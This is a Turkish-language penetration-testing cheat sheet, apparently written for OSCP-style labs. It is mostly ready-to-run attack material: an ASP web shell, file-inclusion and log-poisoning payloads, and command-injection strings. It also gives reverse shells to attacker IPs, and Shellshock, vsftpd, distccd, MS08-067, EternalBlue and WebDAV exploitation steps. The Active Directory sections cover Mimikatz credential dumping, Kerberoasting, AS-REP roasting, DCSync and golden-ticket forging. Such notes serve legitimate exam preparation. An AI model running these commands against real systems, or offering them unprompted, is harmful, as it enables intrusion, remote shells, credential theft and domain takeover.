' 1. URL'den "cmd" parametresini alır (id)
query = Request.QueryString("cmd")  ' query = "id"

If query <> "" Then  ' Koşul geçerli
    Set rs = CreateObject("WScript.Shell")  ' WScript.Shell objesi oluşturur
    
    ' 2. Komutu çalıştırır: cmd /c id
    Set cmd = rs.Exec("cmd /c " & query)  
    o = cmd.StdOut.ReadAll()  ' Çıktıyı okur (uid=0(root) vs.)
    Response.Write("<pre>" & o & "</pre>")  ' HTML pre tag ile gösterir
End If
%>
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

exiftool -Comment='<?php system($_REQUEST['cmd']); ?>' myimage.png
move myimage.png myimage.php.png
myimage.php.png?cmd=ifconfig 
```

DIRECTORY TRAVERSAL

```
CASE: DIRECTORY TRAVERSAL --> READ id_rsa --> SAVE AND SET PERMISSION --> SSH CONNECTION

`http://test.com/index.php?page=../../../../../../../etc/passwd`
`http://test.com/index.php?page=.././../home/burak/.ssh/id_rsa`
`http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
kali@kali:~$curl `http://test.com/index.php?page=../../../../../../../../../home/burak/.ssh/id_rsa`
			...
			-----BEGIN OPENSSH PRIVATE KEY-----
			b******************************************************************************************
			...
			lp*****************************************************************************************
			-----END OPENSSH PRIVATE KEY-----
			...
# Using the Private Key to connect via SSH
kali@kali:~$ssh -i dt_key -p 2222 burak@test.com
			The authenticity of host `http://test.com/222` ([192.168.50.16]:2222)' can't be established.
			Are you sure you want to continue connecting (yes/no/[fingerprint])?yes
			Permissions 0644 for '/home/kali/dt_key' are too open.
			It is required that your private key files are NOT accessible by others.
			This private key will be ignored.
kali@kali:~$chmod 400 dt_key
kali@kali:~$ssh -i dt_key -p 2222 burak@test.com
burak@root:~$
			## 600 (okuma + yazma) → çalışır
			## 400 (sadece okuma) → çalışır ve daha güvenlidir
			## payloads <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal/Intruder>

`http://target.com/index.php?page=%2e%2e%2f%2e%2e%2fetc/passwd`
			%2e%2e → ..
			%2f   → /
Null Byte Injection (Eski PHP sistemlerinde)
`http://target.com/index.php?page=../../../../etc/passwd%00`

Önemli dosya konumları
../../../../wp-config.php                # WordPress DB şifreleri
../../../../config.php                   # phpMyAdmin
../../../../.env                         # Laravel secret, SMTP, DB
../../../../var/www/html/index.php
../../../../home/user/app/app.py
../../../../var/www/html/routes/web.php

case
news.php?file=../../../../../etc/passwd
news.php?file=../../../../../etc/passwd/usr/share/tomcat9/etc/tomcat-users.xml
```

LOG POISONING

```
Test Edilebilecek Başlıklar
 __________________________________________________________________________________________________________
| HTTP Header               | Kullanım                                                                     |
| ------------------------- | ---------------------------------------------------------------------------- |
| User-Agent                | curl -A "<?php system($_GET['cmd']); ?>" `http://victim.com/`                  |
| Referer                   | curl -e "<?php system($_GET['cmd']); ?>" `http://victim.com/`                  |
| X-Forwarded-For           | curl -H "X-Forwarded-For: <?php system($_GET['cmd']); ?>" `http://victim.com/` |
|___________________________|______________________________________________________________________________|

Hangi Loglar Kullanılabilir?

../../../../../../../..//var/log/apache2/access.log
../../../../../../../..//var/log/apache2/error.log
../../../../../../../..//var/log/nginx/access.log
../../../../../../../..//var/log/nginx/error.log
../../../../../../../..//var/log/messages
../../../../../../../..//var/log/auth.log
../../../../../../../..//var/log/vsftpd.log
../../../../../../../..//var/log/mail.log

log dosyasını okuyamıyorsan php wrapper deneyebilirsin
Aşağıdaki iki komut da aynı çıktıyı gösterir.
kali@kali:~$curl `http://test.com/index.php?page=admin.php`
kali@kali:~$curl `http://test.com/index.php?page=php://filter/resource=admin.php`

Örnek Senaryo
### LFI Açığı olan URL: `http://victim.com/index.php?page=../../../../var/log/apache2/access.log`
### Eğer bu dosya içerik olarak gösteriliyorsa → LFI var.

Apache gibi web sunucuları her isteği log dosyasına yazar. Özellikle User-Agent veya Referer gibi başlıkları loglar.
Aşağıdakini kullanarak PHP payload enjekte edebilirsin:

curl -A "<?php system($_GET['cmd']); ?>" `http://victim.com/`
Yukarıdaki komut, şu HTTP isteğini yollar:

		GET / HTTP/1.1
		Host: victim.com
		User-Agent: <?php system($_GET['cmd']); ?>

Aşağıdaki komutla da rce elde etmiş olursun, reverse shell ekleyerek full erişim elde edersin.
`http://victim.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id`

sonrası reverse shell
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
nc -nlvp 4444

Başka bir case :
curl `http://test.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log`
`http://test.com/meteor/index.php?page=admin.php`
bu istek burpden gönderilir, User Agenta, <?php echo system($_GET['cmd']); ?> eklenir.
`http://test.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=id`
```

PHP WRAPPERS

```
Aşağıdaki iki komut da aynı çıktıyı gösterir.
kali@kali:~$curl `http://test.com/meteor/index.php?page=admin.php`
kali@kali:~$curl `http://test.com/meteor/index.php?page=php://filter/resource=admin.php`

`http://test.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`
kali@kali:~$curl "http://test.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

COMMAND INJECTION

```
PAYLOADS: <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection/Intruder>
=============================================================================================================================================================================
OS DETECTION TESTS
# Windows specific commands
ver                 # Shows Windows version
systeminfo          # Detailed system information
type C:\\Windows\\System32\\drivers\\etc\\hosts  # Reads hosts file
net user            # Lists users
dir C:\\             # Lists root directory

# Linux specific commands
uname -a            # Kernel and system information
cat /etc/issue      # Distribution information
cat /proc/version   # Kernel version information
lsb_release -a      # Distribution details
cat /etc/passwd     # User account information
=============================================================================================================================================================================
TIME BASED TESTS
# Linux delay commands
ping -c 10 127.0.0.1   # 10 second delay using ping
sleep 10               # Direct delay command
perl -e "sleep 10"     # Perl based delay
python -c "import time; time.sleep(10)"  # Python delay

# Windows delay commands
ping -n 10 127.0.0.1   # Windows ping delay
timeout 10             # Windows timeout command
Start-Sleep -s 10      # PowerShell sleep
=============================================================================================================================================================================
# Linux commands
; cat /etc/passwd
; ls -la /
; id
; pwd

# Windows commands
& dir C:\\
& type C:\\Windows\\System32\\drivers\\etc\\hosts
& whoami
& net user

=============================================================================================================================================================================
REVERSE SHELL PAYLOADLARI
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
; nc -e /bin/bash ATTACKER_IP 4444
; python -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

=============================================================================================================================================================================
BLIND COMMAND INJECTION

Web Payload Varyasyonları
Kimi filtreler ;, &, | gibi karakterleri engelleyebilir. Bunları aşmak için:

127.0.0.1$(whoami)
127.0.0.1`whoami`
127.0.0.1|id
127.0.0.1&&whoami
127.0.0.1||whoami
=============================================================================================================================================================================
```

SQL INJECTION

```
SQL SERVİSİ İÇİNDE xp_cmdshell ETKİNLEŞTİRME

SQL> EXECUTE sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
SQL> EXECUTE xp_cmdshell 'whoami';
SQL> EXECUTE xp_cmdshell 'powershell -e base64 here';

----------------------------------------

loginden rce alma - userrname kısmından denenir 
xp_cmdshell  enable etme işi - burdan rce geliyor. 
1,2,3,4,5 şeklinde arttırarak kolon sayısını buluyoruz, 3 de hata veriyor 2 de hata vermiyor demekki 2 kolon
admin' UNION SELECT 1,2,3,4,5--+
admin' UNION SELECT 1,2; WAITFOR DELAY '0:0:8'--+
admin' UNION SELECT 1,is_srvrolemember('sysadmin')--+
yukarıdaki komutun cevabı 1 ise devam et, 0 ise zaman kaybı
admin' UNION SELECT 1,2; EXEC sp_configure 'show advanced options', 1--+
admin' UNION SELECT 1,2; RECONFIGURE--+
admin' UNION SELECT 1,2; EXEC sp_configure 'xp_cmdshell', 1--+
admin' UNION SELECT 1,2; RECONFIGURE--+

admin' UNION SELECT 1,2; EXEC xp_cmdshell 'ping 192.168.45.250'--+  bu komutla kendi makinemize ping atabildiğimizi teyit ediyoruz. tcpdump komutu eklersin kaline,
sonra ping yazan yere reverse shell eklersin 
```

SHELLSHOCK EXPLOITATION

```
Eğer bir web servisi varsa ve /cgi-bin/ dizininde bir script görüyorsan, hemen Shellshock denenmeli.
Tespit: nmap -sV -p80 --script http-shellshock --script-args uri=/browser.cgi,cmd=id de.local

Exploit kodu: user agent içine şu paylaod yazılır.
() { :;}; /bin/bash -c 'whoami'

DİĞER HEADERS İLE TEST
curl -H 'Referer: () { :; }; /bin/bash -c "id"' `http://target/cgi-bin/test.cgi`
curl -H 'Cookie: () { :; }; /bin/bash -c "id"' `http://target/cgi-bin/test.cgi`

REVERSE SHELL TESTİNDEN ÖNCE LİSTENER AÇ
nc -lvnp 4444

Örnek 1:
searchsploit shellshock
python shellshock.py --url `http://10.10.10.10/cgi-bin/test.cgi` --payload 'id'

Örnek 2:
reverse shell
curl -A "() { :;}; /bin/bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" http://<victim-ip>/cgi-bin/vuln.sh

Örnek 3:
curl -H "User-agent: () { :; }; echo; echo; /bin/bash -c 'id'" `http://10.129.214.185/cgi-bin/user.sh`

Örnek 4:
curl -A "() { :;}; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.20/4444 0>&1'" `http://victim.com/cgi-bin/vuln.sh`

Örnek 5: CGI parser satır sonunu düzgün anlayamıyorsa echo eklenebilir.
curl -H "User-Agent: () { :;}; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.20/4444 0>&1'" `http://victim/cgi-bin/vuln.sh`

Örnek 6:
/cgi-bin	-->	Not Found
/cgi-bin/	-->	Forbidden
/cgi-bin/user.sh --> burdan shellshock

cgi ve sh dosyalarına bak 
gobuster dir -u http:/10.129.214.185/cgi-bin/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.txt -x sh, cgi
mesela /user.sh dosyasını buldun onun üzerinden exploit edersin 
```

VSFTPD 2.3.4

```
Manuel exploit

nmap taraması atılır çıktı aşağıdaki gibi olmalıdır.
nmap -sV <hedef_ip_adresi>
21/tcp open  ftp     vsftpd 2.3.4

FTP ye bağlan
nc 192.168.150.128 21

Kullanıcı adı parola
USER test:)
PASS test

Shell portuna bağlan
nc -v 192.168.150.128 6200

### SHELL STABILIZE ###
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Distccd - CVE-2004-2687

```
Port: 3632/TCP distccd

Aşağıdaki iki komut da temelde aynı eğer sistemde eğer hedef sistem nc bağlantılarını kabul etmezse case 2 y, denersin.
Case 1: nmap -p 3632 10.129.213.71 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.168 4466 -e /bin/bash'"
Case 2: nmap -p 3632 10.129.213.71 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='bash -i >& /dev/tcp/10.10.14.168/4466 0>&1'"

nc -nlvp 4466
```

MS08-067 - çıkma ihtimali düşük

```
nmap --script smb-vulns* -p 445 -Pn 10.10.10.4
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.23 LPORT=443 EXITFUNC=thread -b "\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40" -f c -a x86 --platform windows
üretilen shellcode ms08-067.py içindeki shellcode kısmına yapıştırılır.
Kullanılan araç : <https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py>

python3 ms08-067.py 10.10.10.4 6 445
nc -nlvp 443
```

MS17-010 Eternalblue

```
<https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py>
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.32 LPORT=4242 -f exe > shell.exe
nc -nlvp 4242
python send_and_execute.py legacy.htb shell.exe
bunun için githubda bir sürü kod var ama çalışmayanlar da var, çaresiz kalırsan msfconsole kullan.
```

PORT KNOCKING

```
cat knockd.conf

# openSSH ports sequence: 571, 290, 911
for x in 571 290 911; do nmap -Pn --max-retries 0 -p $x 10.10.10.43 && sleep 1; done
#bundan sonra yapacağın nmap taramalarında kapalı olan portlar gözükmeye başla
nmap 10.10.10.43

22/tcp  open
80/tcp  open
443/tcp open

ssh açıldığına göre ssh bağlantısı yapabilirsin
ssh -i nineveh.priv amrois@10.10.10.43
```

WEBDAV

```
Tespit --> nmap --script http-webdav-scan -p 80,443 10.10.10.15
nmap -p 80 --script http-methods target

eğer nmap taramalarında webdav çıktısı görürsen aşağıdakileri uygulayabilirsin

davtest --url `http://10.10.10.15`
curl -X PUT `http://10.10.10.15/test.html` -d @test.html    //bu komutla dosya yükleyebildiğimizi görebiliyoruz.
kullanıcı adı parola ile - önemli 
curl -u burak:passwd-header 'Destination:http://10.10.10.10/cmdasp.aspx' 'http://10.10.10.10/cmdasp.txt'

burda senaryoda sunucu aspx dosya türünü yüklemeyi desteklemiyor, biz txt olarak yükleyip dosya yerini değiştirirken uzantısını da davtest aracıyla değiştiriyoruz.

msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.29 LPORT=1234 -o shell.aspx
mv shell.aspx shell.txt
curl -X PUT `http://10.10.10.15/shell.txt` --data-binary @shell.txt
curl -X MOVE --header 'Destination:`http://10.10.10.15/shell.aspx`' '`http://10.10.10.15/shell.txt`'
nc -nlvp 1234

dosyayı çağırdığımızda da shell düşüyor.
Dosya Okuma: curl'e @ işaretiyle belirtilen shell.txt dosyasını okumasını söyler.
Binary Veri Aktarımı: --data-binary sayesinde, shell.txt dosyasının içeriği hiçbir değişiklik veya işleme tabi tutulmadan (örn. yeni satır karakterlerinin
kaldırılması gibi) doğrudan isteğin gövdesi olarak gönderilir. Bu, dosyanın orijinal halinin sunucuya ulaşmasını garanti eder.

diğer bir webdav bağlantı aracı
cadaver http://10.10.10.10/    bunda kendisi kullanıcı adı parola soruyor. 
```

PHP TYPE JUGGLING (Login panellerinde)

```
Bir php web uygulaması varsa ve parola hashi md5 formatındaysa, eğer bu hash 0e ile başlarsa type juggling dediğimiz bir zafiyet ortaya çıkıyor.
$password = "0e123456" bir string ifadedir.
Eğer bir kullanıcı şu değeri gönderirse: pass=0e789999

PHP bunu sayı olarak bilimsel gösterim (scientific notation) gibi yorumlayabilir (0e... = 0).
0e123456 == 0e789999 → her ikisi de `0` kabul edilir → karşılaştırma TRUE olur.
Sonuç: if bloğu çalışır ve saldırgan giriş yapabilir.

Örnek
$ echo -n 240610708 | md5sum   0e462097431906509019562988736854
$ echo -n QNKCDZO   | md5sum   0e830400451993494058024219903391
$ echo -n aabg7XSs  | md5sum   0e087386482136013740957780965295

Bizdeki durum
| 1  | admin                 | 0e462096931906507119562988736854

yani admin hashi ilk sıradaki örnek ile aynı olduğu için admin paroala  240610708 ve diğerleri de kabul edilir.
admin:QNKCDZO is allowed to login
```

DRUPALGEDDON2 RCE

```
<https://github.com/lorddemon/drupalgeddon2/blob/master/drupalgeddon2.py>

Aşağıdaki örnek ile direkt rce alırsın
python2 drupalgeddon2.py -h `http://10.10.10.9` -c 'dir C:\\Users\\burak\\Desktop\\'
```

URI FILE ATTACK

```
KALI:
sudo responder -I eth0

cat @hax.url
	[InternetShortcut]
	URL=anything
	WorkingDirectory=anything
	IconFile=\\\\192.168.68.68\\%USERNAME%.icon
	IconIndex=1

smb ile bağlandığın paylaşıma bunu yükle

smbclient \\\\\\\\10.10.10.10\\\\DocumentsShare
put @hax.url
quit

bir süre sonra respondera ntlm hash düşecek
Özet Mantık:
.url dosyasındaki IconFile=\\\\IP\\%USERNAME%.icon satırı, Windows’u otomatik SMB bağlantısı kurmaya zorlar.
Bu SMB isteği sırasında sistem, kullanıcının NTLMv2 hash’ini gönderir (eğer otomatik kimlik doğrulama açıksa).
Saldırganın Responder aracı bu hash’i yakalar.
```

AD ENUMERATION with SHARHOUND and BLOODHOUND

```bash
PS C:\\Users\\burak\\Downloads>Import-Module .\\Sharphound.ps1 veya
PS C:\\Users\\burak\\Downloads>. .\\Sharphound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip

SharpHound komutları örnek
.\\SharpHound.exe -c all -d test.dc --ldapusername burak --ldappassword fethiye
.\\SharpHound.exe -c all
```

BLOODHOUND ÇALIŞTIRMA

```
### 1. Hazırlık ve Kurulum (Sadece İlk Sefer)
Docker ve motorunu yüklemek için:

sudo apt update
sudo apt install docker.io docker-compose -y
sudo systemctl start docker
sudo systemctl enable docker

### 2. BloodHound Dosyalarını Çekme
Resmi reposunu indir ve doğru klasöre gir (en kritik adım burası):
cd /home/kali/Desktop/TOOLS/
git clone <https://github.com/SpecterOps/BloodHound.git>
cd BloodHound/examples/docker-compose/

### 3. Sistemi Çalıştırma (Ayağa Kaldırma)
Konteynerları arka planda başlat:
sudo docker-compose up -d

### 4. Şifreyi Yakalama

Eğer ilk kurulumsa, admin şifresi loglarda rastgele üretilir. Şifreyi şu komutla gör:
sudo docker-compose logs | grep "Password"

### 5. Arayüze Giriş
Tarayıcıyı aç ve şu adrese git:
- URL: http://localhost:8080
- Username: admin
- Password: (Loglardan aldığın veya notundaki o uzun şifre)

### Veri Toplama ve Analiz (Hızlı Komutlar)

**Kullanıcı Bilgilerini Çekme (Dışarıdan):**
Senin az önce yaptığın, makineye girmeden veri toplama komutu:
bloodhound-python -u "oscp.burak" -p 'password01' -d oscp.mockexam -c all --zip -ns 192.168.217.97 -dc dc01.oscp.mockexam 
bloodhound-python -u 'oscp.burak' -p 'password01' -d oscp.mockexam -c all --zip -ns 10.10.10.10

bloodhound-python
-u 'oscp.burak'      # domain kullanıcısı
-p 'password'        # parola
-d oscp.mockexam     # domain adı
-c all               # her şeyi topla (users, groups, acls, sessions...)
--zip                # çıktıyı zip olarak paketle
-ns 10.10.10.10      # nameserver = DC'nin IP'si

Verileri Yükleme

1. Tarayıcıdaki BloodHound arayüzüne git.
2. Sağ taraftaki **"Upload Data"** butonuna bas.
3. Oluşan .json dosyalarını seç ve sürükle.

Analiz (Neye Bakmalı?):

Arama Çubuğu Kendi kullanıcını (hrapp-service) arat.
Sağ Tık Shortest Paths to Domain Admins (Domain Admin'e giden en kısa yol).
Yolların Anlamı `MemberOf`: Bir gruba üyesin.
GenericAll: Kullanıcıyı/Objeyi tamamen yönetebilirsin (Şifre değiştirme vb.).
WriteDacl: Yetkileri değiştirebilirsin.

### Durdurma ve Temizlik

İşin bittiğinde sistemi kapatmak istersen:
# Sadece durdurur:
sudo docker-compose stop

# Her şeyi siler (Veriler gider!):
sudo docker-compose down

# ── 5. ANALİZ (Neye Bakmalı?) ───────────────────────────────

# Arama çubuğuna kendi kullanıcını yaz → sağ tık:
#   → "Shortest Paths to Domain Admins"    (DA'ya en kısa yol)
#   → "Reachable High Value Targets"       (ulaşılabilir kritik hedefler)

# Hazır Sorgular (Analysis sekmesi):
#   → "Find all Domain Admins"
#   → "Find Shortest Paths to Domain Admins"
#   → "Find Principals with DCSync Rights"
#   → "Users with Most Local Admin Rights"
#   → "Kerberoastable Accounts"
#   → "ASREPRoastable Accounts"

# Kritik Kenar (Edge) Tipleri:
#   MemberOf      → Bir gruba üyesin
#   GenericAll    → Objeyi tamamen kontrol edebilirsin (şifre değiştirme vb.)
#   GenericWrite  → Belirli attribute'ları yazabilirsin
#   WriteDacl     → Yetkileri değiştirebilirsin
#   ForceChangePassword → Şifre değiştirebilirsin (eski şifre gerekmez)
#   AllExtendedRights   → Tüm extended yetkilere sahipsin
#   DCSync        → Domain'deki hash'leri çekebilirsin
```

MİMİKATZ KULLANIMI

```
OSCP Mimikatz Komut Listesi

1. Mimikatz Başlat ve Yetki Al
mimikatz.exe
privilege::debug
# Çıktıda: Privilege '20' OK görülmeli
# Bu, Mimikatz'in sistem işlemlerine erişmesi için gerekli

2. NTLM Hash'lerini Dump Et (SAM Veritabanından)
lsadump::sam
# Yerel kullanıcıların NTLM hashlerini gösterir
# Bu komut 'lsadump::lsa /patch' değil, 'lsadump::sam' olmalı
# lsadump::lsa /patch → genellikle domain ortamında SYSTEM haklarıyla çalıştırılır

3. Oturum Açmış Kullanıcıların Şifre ve Hash Bilgilerini Al
sekurlsa::logonpasswords
# Bellekteki kullanıcı oturum bilgilerini gösterir (şifre, NTLM, Kerberos)

4. Bellekteki Kerberos Ticket'larını Görüntüle
sekurlsa::tickets
# RAM'de tutulan Kerberos ticketlarını listeler

5. Kerberos Ticket'larını Export Et (Pass-the-Ticket için)
sekurlsa::tickets /export
# .kirbi uzantılı ticket dosyalarını export eder

6. Pass-the-Hash ile Komut Satırı Aç
sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLMHASH /run:cmd.exe
# NTLM hash ile kimlik doğrulaması yaparak yeni bir oturum açılır
# Örnek: sekurlsa::pth /user:burak /domain:corp.local /ntlm:cc36cf7a8514893efccd3324464t

bellekteki kullanıcının ntlm hashini çek
PS> .\\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"   hashi kır

mimikatz konumu, /usr/share/windows-resources/mimikatz/x64 konumundadır.

mimikatzde hata alırsan düzgün çalıştıran komut 
GodPotato-NET4.exe -cmd "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""
```

KERBEROSTING

```
Amaç:
Domain ortamındaki SPN (servis) atanmış hesaplardan daha ayrıcalıklı kullanıcıların şifrelerini offline olarak kırarak sistemde yetki yükseltmek veya 
lateral movement (yanlamasına yayılma) yapmaktır.

Detaylı Amaçlar:
1. Yetki Yükseltme (Privilege Escalation)
SPN atanmış kullanıcılar genellikle servis hesaplarıdır (örnek: MSSQL servis hesabı, IIS hesabı). Bu hesaplar sıklıkla Domain Admin, Backup Operators, Server 
Operators gibi güçlü gruplardadır. Şifresi kırıldığında → Hemen yönetici yetkisi elde edebilirsin.

Gerekenler:
AD ortamında bir hesap
SPN tanımlı hesaplar elde etmek
Bu hesaplardan bilet talep edilir.
Biletlerden hash döner ve hashler kırılır.
En son hashi kırılan kullanıcıya bağlanılır.
SPN atanmış kullanıcı = kerberoastable kullanıcı

SPN li kullanıcılar nasıl bulunur:
Import-Module .\\PowerView.ps1
Get-DomainUser -SPN

Yöntem 1:
python GetUserSPNs.py mock.exam/burak:Password1 -dc-ip 10.10.10.10 -request
hashcat --help | grep Kerberos
hashcat -m 13100 kerberoast.txt rockyou.txt

# -m 13100 → Kerberos 5 TGS-REP etype 23 (RC4-HMAC) modu, hash genelde bu formattadır.
# AES-128 için: -m 13200
# AES-256 için: -m 13300
# Ancak pratikte en sık RC4-HMAC (13100) ile karşılaşılır.

Yöntem 2: Rubeus kullanarak

Rubeus.exe kerberoast /nowrap
# Hashi kaydet
echo "$krb5tgs..." > kerberoast_hash.txt
# Hash kırma
hashcat -m 13100 -a 0 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt

Yöntem 3:
Import-Module .\\PowerView.ps1
Get-DomainUser -SPN
Rubeus.exe kerberoast /user:hedefkullanici #kullanıcı yukarıdaki komutdan alınır.
# veya bunun yerine
GetUserSPNs.py -request -dc-ip 10.10.10.5 domain.local/user:pass -target-user hedefkullanici
hashcat -m 13100 -a 0 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt

Yöntem 4:
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 oscp.exam/burak:Parola123
echo "$krb5tgs..." > kerberoast_hash.txt
hashcat -m 13100 -a 0 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt

NOT: eğer zaman damgası hatası alırsan saati eşitlemen gerek
sudo ntpdate hokkaido-aerospace.com    bu örnekde hedef makinenle senin makinenin saati eşitlenir. 
sudo ntpdate test.com
ntpdate yüklü değilse: sudo apt install ntpdate

# ── 6. ÖZET AKIŞ ────────────────────────────────────────────
# 1. DC'yi bul
# 2. SPN atanmış kullanıcıları listele
# 3. TGS bileti talep et → hash al
# 4. hashcat ile hash'i kır
# 5. Kırılan şifreyle evil-winrm / psexec / smbclient ile bağlan
```

ASREPROSTING

```
Kerberos Preauthentication Kapalıysa Ne Olur?

Eğer "preauthentication" kapalıysa, saldırgan şunu yapabilir:
Kerberos’ta pre-authentication kapalı kullanıcılar, şifre hash'lerini (AS-REP) istek üzerine verir.
1. İstediği bir kullanıcı adına sahte bir AS-REQ gönderir.
2. Domain controller ona AS-REP yanıtı verir (şifrelenmiş bir veri içerir).
3. Bu yanıtı alarak, offline (yani sistemden bağımsız) bir brute-force saldırısı yapar ve şifreyi denemeye başlar.
Tıpkı **Kerberoasting** gibi, ama burada hedef servis hesabı değil, doğrudan kullanıcı hesabıdır.
Burda hedefin, Active Directory’de **"Kerberos preauthentication istemeyen" kullanıcıları bulmak**.

Tespit Yöntemleri:
Powerview ile :
Get-DomainUser -PreauthNotRequired

Bloodhound: aşağıdaki seçenekde çıkması lazım
Do not require Kerberos preauthentication: True

Impacket ile:
python3 GetNPUsers.py test.com/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10

CME: Eğer anonymous LDAP izni varsa, preauth kapalı kullanıcıların AS-REP hash’lerini alır.
cme ldap <DC_IP> -u '' -p '' --asreproast

SALDIRI:
Yöntem 1:
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast test.com/burak
hashcat --help | grep -i "Kerberos"
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

Yöntem 2:
.\\Rubeus.exe asreproast /user:username /domain:domain.com /dc:10.10.10.10 /nowrap
.\\Rubeus.exe asreproast /nowrap  # bu sana hash verir sonrası yine hash kırma
sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

DCSYNC

```
# dcsync attack - ama öncesinde admin olman lazım, sen yine de her türlü çalıştır

lsadump::dcsync /user:Administrator
lsadump::dcsync /user:corp\Administrator
lsadump::dcsync /domain:company.local /all

# ============================================================
# DCSYNC - HASH ÇEKME KOMUTLARI (Mimikatz)
# Ön koşul: Domain Admin veya DCSync yetkisi olmalı
# ============================================================

privilege::debug                                    # Önce debug yetkisi al

# Belirli kullanıcının hash'ini çek
lsadump::dcsync /user:Administrator
lsadump::dcsync /user:corp\Administrator            # Domain prefix ile
lsadump::dcsync /user:krbtgt                        # Golden Ticket için

# Tüm domain hash'lerini çek
lsadump::dcsync /domain:company.local /all
lsadump::dcsync /domain:company.local /all /csv     # CSV formatında kaydet

# Linux üzerinden (Impacket)
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP>                    # Tüm hash'ler
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-ntlm      # Sadece NTLM
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-user krbtgt  # Tek kullanıcı

# Hash ile DCSync (parola yoksa)
impacket-secretsdump -hashes ':<NTHASH>' <DOMAIN>/<USER>@<DC_IP>
```

DCSYNC GOLDEN TICKET

```
# ============================================================
# DCSYNC & GOLDEN TICKET - OSCP CHEAT SHEET
# ============================================================

# ── 1. DCSYNC NEDİR? ─────────────────────────────────────────
# DCSync → Saldırganın DC gibi davranarak NTLM hash'lerini çekmesidir.
# Gerekli yetki: Domain Admin, Domain Controllers grubu veya delegasyon verilmiş hesap.
# En çok kullanım amacı: krbtgt hash'ini alıp Golden Ticket oluşturmak.

# ── 2. HAZIRLIK (Mimikatz) ───────────────────────────────────

mimikatz.exe
privilege::debug                                              # Debug yetkisi al (zorunlu)

# ── 3. HASH ÇEKME (DCSync) ───────────────────────────────────

# Belirli kullanıcının hash'ini çek
lsadump::dcsync /user:krbtgt                                  # Golden Ticket için (en önemli)
lsadump::dcsync /user:Administrator
lsadump::dcsync /user:corp\Administrator                      # Domain prefix ile

# Tüm domain hash'lerini çek
lsadump::dcsync /domain:company.local /all
lsadump::dcsync /domain:company.local /all /csv               # CSV formatında kaydet

# DCSync yoksa alternatif yöntemler
lsadump::lsa /inject /name:krbtgt                             # LSA Inject (2. tercih)
lsadump::lsa /patch                                           # Son çare, gürültülü

# Linux üzerinden (Impacket)
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP>                       # Tüm hash'ler
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-ntlm         # Sadece NTLM
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-user krbtgt  # Tek kullanıcı
impacket-secretsdump -hashes ':<NTHASH>' <DOMAIN>/<USER>@<DC_IP>          # Hash ile

# ── 4. DOMAIN SID ÖĞRENME (Golden Ticket için gerekli) ───────

whoami /user                                                  # Windows - son RID kısmı hariç al
Get-ADDomain | select DomainSID                               # PowerShell
impacket-lookupsid <DOMAIN>/<USER>:<PASS>@<DC_IP>             # Linux (getPac değil bu doğrusu)

# ── 5. GOLDEN TICKET OLUŞTURMA ───────────────────────────────

kerberos::purge                                               # Eski biletleri temizle (önerilir)

# Yapı:
kerberos::golden /user:<KULLANICI> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:500 /ticket:golden.kirbi

# Örnek:
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-********************* /krbtgt:55***********************************  /ticket:golden.kirbi

# /user    → Taklit edilecek kullanıcı (gerçek olması gerekmez)
# /domain  → Hedef domain adı
# /sid     → Domain SID (son RID kısmı olmadan)
# /krbtgt  → krbtgt NTLM hash'i
# /id      → RID (500 = Administrator)
# /ticket  → Kaydedilecek bilet dosyası

